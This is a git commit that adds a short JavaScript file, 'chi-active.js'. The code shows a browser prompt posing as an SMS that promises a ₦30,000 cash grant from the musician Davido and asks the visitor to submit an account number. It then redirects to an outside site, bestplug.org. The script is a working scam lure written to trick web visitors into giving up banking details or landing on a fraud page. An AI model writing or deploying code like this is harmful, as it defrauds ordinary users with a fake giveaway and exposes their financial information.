21b2009e6693e0299ff287fc329409fe76ee3af9
vibeblog <enom02567@gmail.com>
2025-05-04 08:53:33 +0100

    Create chi-active.js

---
+++ chi-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW CASH'
+password=prompt('SMS: Congratulations, you have been selected to receive ₦30,000 cash grant from Davido in celebration of his wife birthday, Press Ok to submit account number Now ','WITHDRAW CASH');
+if (password != 'WITHDRAW CASH') {
+location.href='https://bestplug.org/chi-chi.html';
+}
